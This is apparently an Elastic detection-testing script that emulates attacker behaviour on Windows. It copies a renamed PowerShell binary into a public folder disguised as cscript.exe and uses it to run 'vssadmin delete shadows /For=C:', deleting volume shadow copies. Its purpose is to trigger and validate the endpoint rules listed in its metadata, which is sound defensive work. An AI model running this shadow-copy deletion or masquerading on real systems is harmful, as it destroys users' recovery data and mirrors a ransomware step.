# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="08c90b80-538e-42ab-8986-342237f9740f",
    name="inhibit_system_recovery_lolbas_child",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(id="16c84e67-e5e7-44ff-aefa-4d771bcafc0c", name="Execution from Unusual Directory"),
        RuleMetadata(
            id="d3588fad-43ae-4f2d-badd-15a27df72132", name="Inhibit System Recovery via Untrusted Parent Process"
        ),
        RuleMetadata(id="35dedf0c-8db6-4d70-b2dc-a133b808211f", name="Binary Masquerading via Untrusted Path"),
        RuleMetadata(id="740ad26d-3e67-47e1-aff1-adb47a697375", name="Inhibit System Recovery via Signed Binary Proxy"),
    ],
    techniques=["T1218", "T1036", "T1216", "T1220", "T1490", "T1059"],
)
def main():
    EXE_FILE = _common.get_resource_path("bin/renamed_posh.exe")

    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    cscript = "C:\\Users\\Public\\cscript.exe"
    _common.copy_file(EXE_FILE, cscript)

    # Execute command
    log.info("Deleting Shadow Copies using Vssadmin spawned by cscript")
    _ = _common.execute_command([cscript, "/c", vssadmin, "delete", "shadows", "/For=C:"], timeout_secs=10)
    _common.remove_file(cscript)
